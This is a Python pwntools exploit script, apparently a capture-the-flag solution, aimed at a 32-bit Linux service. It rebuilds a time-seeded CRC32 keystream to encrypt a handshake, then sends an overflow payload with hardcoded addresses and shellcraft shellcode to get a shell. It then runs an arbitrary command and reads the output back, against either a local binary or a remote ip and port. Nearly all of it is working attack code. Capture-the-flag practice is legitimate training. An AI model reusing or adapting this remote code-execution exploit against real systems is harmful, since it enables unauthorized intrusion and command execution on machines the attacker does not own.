from pwn import *
import binascii
import time
context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'info'

class CRCEncryption:
	"""docstring for CRCEncryption"""
	def __init__(self, key):
		self.key = key
		self.last = 0

	def Encode(self, data):
		edata = ''
		for i in data:
			edata += chr(ord(i) ^ self.GetByte())
		return edata

	def GetByte(self):
		if self.last == 4:
			self.key = (binascii.crc32(p32(self.key)) + 2 ** 32) % 2 ** 32
			self.last = 0
		self.last += 1
		return (self.key >> (8 * (self.last - 1))) & 0xff
		


def exp(local,binary,msg,ip=0,port=0,timeout=1):
	if local == 1:
		p = process(binary)
		# gdb.attach(p, 'b * 0x08048C26\nc')
	else:
		p = remote(ip, port)
		
	try:
		tm = int(time.time())
		seed = (binascii.crc32('explorer' + p32(tm) + p32(0)) + 2 ** 32) % 2 **32
		ctx = CRCEncryption(seed)
		p.send(p32(seed))
		p.send(ctx.Encode(p32(tm) + p32(0)))
		p.send(ctx.Encode('\x01'))
		p.send(ctx.Encode(p32(1023)))
		p.send(ctx.Encode(p8((-127 + 256) % 256)))
		p.send('\x00\x00')
		p.send('\x00' * 0x405 + p32(0x080ea000) + '\x00' * 8 + p32(0) + p32(0x080deb57) + asm(shellcraft.sh()))
		# p.recv(1024)
		# p.send(ctx.Encode('explorer' + p32(tm) + p32(0)))

		p.sendline('echo 123')
		p.recvuntil('123',timeout=timeout)
		p.sendline(msg)
		p.sendline('echo 456')
		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		# p.interactive()
		p.close()
		return flag[:-3]
	except:
		# print 'failed'
		p.close()
		return ''

if __name__ == '__main__':
	print exp(True,'bin1','cat flag')
